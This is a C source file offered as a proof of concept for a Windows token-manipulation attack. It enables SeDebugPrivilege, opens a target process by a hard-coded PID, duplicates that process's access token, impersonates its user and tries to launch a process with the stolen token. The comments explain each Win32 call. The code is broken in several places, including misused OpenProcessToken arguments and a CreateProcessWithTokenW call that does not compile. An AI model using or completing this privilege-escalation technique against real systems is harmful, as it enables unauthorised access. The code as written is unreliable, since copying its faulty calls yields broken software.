/*
	Author:		Lemur
	GitHub:		https://github.com/1emvr
	Email:		1emvr@protonmail.com
	Date:		1/6/2023	14:50 PM

	Proof of Concept for Token Manipulation Attack. A basic layout for further development:

		An Access Token on Windows is an object which specifies the security context of a proccess or thread.

		When a user logs into their syste, the system generates and Access token which contains specific information
		such as SID of the account, a login SID, source of the access token, so on..

		Every process which is execute on the behalf of the user has a copy of this access token.
		There are two types of access tokens:

			Primary Token: A token created by the Windows Kernel, assigned to a proccess to 
			represent the default security information for that process.

			Impersonation Token: A token which captures the security information of a client process, 
			allowing a server to impersonate the client process in security operations.

*/

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "advapi32.lib") 

void EnablePrivileges(HANDLE hToken, LPCSTR lpszPrivilege, BOOL bEnablePrivilege) {
/*
	[Custom] Arguments for EnablePrivileges() function:

	- Token Handle.
	- lpszPrivilege.
	- Enalbed/Disabled.
*/
	
	TOKEN_PRIVILEGES token_privs;
	LUID luid;

	if (! LookupPrivilegeValue(NULL, (LPCWSTR) lpszPrivilege, &luid)) {
	/*
		Arguments for LookupPrivilegeValue() function:
		The function looks for the locally unique identifier (LUID) used on a specified system to locally represent the specified privilege name.

		- [in]	LPCSTR lpSystemName:	A pointer to a null-terminated string that specifies the name of the system on which the privilege name is retrieved.
		- [in]	LPCSTR lpName:			A pointer to a null-terminated string that specifies the privilege. This retrieves the name of the token, specified by a const name or by it's string name.
		- [out] PLUID lpUid:			A pointer to a variable that receives the LUID by which the privilege is known on the system specified by teh *lpSystemName* parameter.
	*/
		printf("LookupPrivilegeValue() Failed : (");
		printf("Error code : %d", GetLastError());
		exit(-1);
	}
	token_privs.PrivilegeCount = 1;
	token_privs.Privileges[0].Luid = luid;

	if (bEnablePrivilege) {
		token_privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else {
		token_privs.Privileges[0].Attributes = 0;
	}

	if (! AdjustTokenPrivileges(hToken, FALSE, &token_privs, NULL, NULL, NULL)) {
	/*
		Arguments for AdjustTokenPrivileges() function:
		Enables or disables privileges in the specified access token. Requires TOKEN_ADJUST_PRIVILEGES access:

		- [in]	HANDLE TokenHandle:					A handle to the access token that contains the privileges to be modified.
		- [in]	BOOL DisableAllPrivileges:			Specifies whether the function disables all of the token's privileges.
		- [in]	PTOKEN_PRIVILEGES NewState:			A pointer to a TOKEN_PRIVILEGES struct that specifies an array of privileges and thier attributes
		- [in]	DWORD BufferLength:					Specifies the size of the buffer pointed to by PreviousState parameter, in bytes
		- [out] PTOKEN_PRIVILEGES PreviousState:	A pointer to a buffer that the function fills with a TOKEN_PRIVILEGES struct of previous state modified privileges
		- [out] PDWORD ReturnLength:				A pointer to a variable that receives the required size of the buffer pointed to by the PreviousState paremeter, in bytes
	*/
		printf("AdjustTokenPrivileges() Failed : (");
		printf("Error code : %d", GetLastError());
	}
	printf("Privileges enabled! ;)\n");
}

int main() {
/*
	Setting up pid, handlers, zeroing memory buffers and size of startupinfo struct
*/
	int pid_to_impersonate = 464;

	HANDLE TokenHandle = NULL;
	HANDLE DuplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;

	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	HANDLE CurrentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), (DWORD) SE_DEBUG_NAME, (PHANDLE) TokenHandle);
	/*
		Arguments for OpenProcessToken() function:
		Function that opens the access token associated with a process:

		- [in]	HANDLE ProcessHandle:		A handle to precess whoes access token is opened.
		- [in]	DWORD DesiredAccess:		Specifies an access mask that specifies the requested types of access to the access token.
		- [out] PHANDLE TokenHandle:		A pointer to a handle that identifies the newly opened access token when the function returns.
	*/
	if (! getCurrentToken) {
		printf("Couldn't retreive current process token :(\n");
		printf("Error code : %d", GetLastError());
	}
	EnablePrivileges(TokenHandle, (LPCSTR) SE_DEBUG_NAME, getCurrentToken);

	HANDLE rProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid_to_impersonate);
	/*
		Arguments for OpenProcess() function:
		Opens an existen local process object:

		- [in] DWORD dwDesiredAccess:	Access to the process object. Rights are checked against the security descriptor for the process.
		- [in] BOOL bInheritHandle:		If TRUE, processes created by this process will inherit the handle.
		- [in] DWORD dwProccessId:		The identiier of the local process to be opened.
	*/
	if (! rProcess) {
		printf("OpenProccess() Failed : (\n");
		printf("Error code : %d", GetLastError());
	}
	BOOL rToken = OpenProcessToken(rProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);
	if (! rToken) {
		printf("OpenProcessToken() Failed : (\n");
		printf("Error code : %d\n", GetLastError());
	}
	BOOL ImpersonateUser = ImpersonateLoggedOnUser(TokenHandle);
	if (!ImpersonateUser) {
		printf("ImpersonateLoggedOnUser() Failed ;(\n");
		printf("Error code : %d\n", GetLastError());
	}
	if (! DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateTokenHandle)) {
	/*
		Arguments for DuplicateTokenEx() function:
		Creates a new access token that duplicates an existing token. This function can create either primary token or impersonate token.

		- [in] HANDLE hExistingToken:							A handle to an access token opened with TOKEN_DUPLICATE access.
		- [in] DWORD dwDesiredAccess:							Specifies the requested access right for the new token. Compares requested with existing tokens DACL.
		- [in] LPSECURITY_ATTRIBUTES lpTokenAttributes:			A pointer to SECURITY_ATTRIBUTES struct that specifies a security descriptor for the new token/child processes can inherit.
		- [in] SECURITY_IMPERSONATE_LEVEL ImpersonationLevel:	Specifies a value form SECURITY_IMPERSONATION_LEVEL enumeration.
		- [in] TOKEN_TYPE TokenType:							Specifies a value from the TOKEN_TYPE enumeration.
		- [out] PHANDLE phNewToken:								A pointer to a HANDLE variable that receives the new token.
	*/
		printf("DuplicateTokenEx() Failed ;(\n");
		printf("Error code : %d\n", GetLastError());
	}
	if (! CreateProcessWithTokenW(DuplicateTokenHandle, TOKEN_ALL_ACCESS, NULL, (LPWSTR) SecurityImpersonation, TokenPrimary, )) {
	/*
		Arguments for CreateProcessWithTokenW() function:
		Creates a new process and it's primary thread.

		- [in]		HANDLE hToken:									A handle to the primary token that represents a user
		- [in]		DWORD dwLogonFlags:								The logon option. This can be zero or more values
		- [in]		LPCWSTR lpApplicationName:						The name of the module to be executed
		- [i/o]		LPWSTR lpCommandLine:							Command line arguments to be executed
		- [in]		DWORD dwCreationFlags:							The flags that control how the process is created
		- [in]		LPVOID lpEnvironment:							A pointer to an environment block for the new process
		- [in]		LPCWSTR lpCurrentDirectory:						The full path to the current directory for the process
		- [in]		LPSTARTUPINFOW lpStartupInfo:					A pointer to STARTUPINFO or STARTUPONFOEX structure
		- [out]		LPPROCESS_INFORMATION lpProcessInformation:		A pointer to a PROCESS_INFORMATION structure that receives identification information for making the new process
	*/
	}
}

/*

*/
